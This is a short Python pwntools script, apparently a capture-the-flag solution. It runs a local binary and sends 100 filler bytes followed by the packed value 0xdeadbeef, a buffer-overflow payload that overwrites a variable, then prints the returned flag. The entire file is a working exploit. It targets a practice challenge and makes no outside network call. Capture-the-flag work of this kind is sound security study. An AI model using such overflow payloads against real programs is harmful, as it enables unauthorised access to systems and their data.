from pwn import *

#context.log_level = 'debug'

con = process('./bin')

con.send('a'*100+p32(0xdeadbeef))
flag = con.read()
print flag
